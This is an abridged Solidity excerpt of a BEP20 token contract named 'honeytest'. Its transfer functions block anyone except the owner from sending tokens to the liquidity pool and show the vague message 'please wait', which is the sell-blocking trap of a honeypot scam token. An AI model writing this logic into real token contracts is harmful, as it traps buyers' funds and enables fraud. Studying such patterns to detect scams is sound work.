...
contract honeytest is IBEP20, Ownable{
	...
	function getliquidity(address _liquidity) public onlyOwner {
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool){
        ...
        else require(recipient != liquidity || sender == owner(), "please wait");
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if(liquidity != address(0)) require(recipient != liquidity || sender == owner(), "please wait");  
